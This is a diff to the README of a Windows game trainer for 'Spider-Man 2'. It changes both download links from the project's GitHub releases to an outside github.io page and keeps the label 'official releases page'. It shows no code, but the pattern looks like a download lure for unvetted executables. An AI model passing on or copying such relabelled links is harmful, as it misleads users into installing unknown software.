@@ -1,6 +1,6 @@
 # 🕷️ Spider-Man-2-Trainer-2026 - Customize your gameplay experience today
 
-[![](https://img.shields.io/badge/Download-Spider--Man--2--Trainer--2026-blue.svg)](https://github.com/fiqueen8659/Spider-Man-2-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Spider--Man--2--Trainer--2026-blue.svg)](https://fiqueen8659.github.io)
 
 This software modifies game parameters for Spider-Man 2 on Windows 10 and Windows 11. It provides players with tools to adjust health, stamina, and game speed. This tool works locally on your computer to change variables within the game engine.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these standards to run the application correctly:
 
 ## 📥 Downloading the Software
 
-Visit the [official releases page](https://github.com/fiqueen8659/Spider-Man-2-Trainer-2026/releases) to download the package. 
+Visit the [official releases page](https://fiqueen8659.github.io) to download the package. 
 
 1. Navigate to the link above in your web browser.
 2. Find the most recent entry labeled "Latest".
